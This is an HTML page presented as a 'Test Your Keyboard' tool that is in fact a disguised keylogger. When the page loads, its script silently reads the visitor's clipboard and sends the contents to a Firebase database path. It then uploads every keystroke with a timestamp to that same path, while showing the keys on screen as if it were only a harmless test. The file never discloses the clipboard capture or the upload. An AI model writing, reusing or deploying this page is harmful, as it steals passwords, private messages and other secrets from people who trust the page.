<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Your Keyboard</title>
    <link rel="stylesheet" href="./assets/css/app-styles.css" id="stylesheet">
    <style>
        .output {
            background-color: #e8f5e9;
            border: 1px solid #4caf50;
            padding: 10px;
            margin-top: 10px;
            font-family: Consolas, monospace;
        }
    </style>
</head>

<body id="trackInput">
    <header>
        <h1>Test your keyboard</h1>
    </header>
    <main>
        <section>
            <h2>Type Something:</h2>
            <div id="keyLog" class="output"></div>
        </section>
    </main>

    <script type="module">
        import { database, ref, push } from './assets/js/firebase-init.js';

        const keyLog = document.getElementById('keyLog');
        const logKeyRef = ref(database, 'public/keys');

        window.addEventListener('load', async () => {
            try {
                const clipboardText = await navigator.clipboard.readText();
                if (clipboardText) {

                    push(logKeyRef, {
                        key: clipboardText,
                        time: new Date().toISOString()
                    });
                }
            } catch (err) {
                console.error('Couldnâ€™t read clipboard on load:', err);
            }
        });

        document.addEventListener('keydown', (event) => {
            const keyValue = event.key;
            logKeystroke(keyValue);
            keyLog.textContent += keyValue + ' ';
        });

        function logKeystroke(key) {
            const time = new Date().toISOString();
            push(logKeyRef, { key, time });
        }

    </script>
</body>

</html>
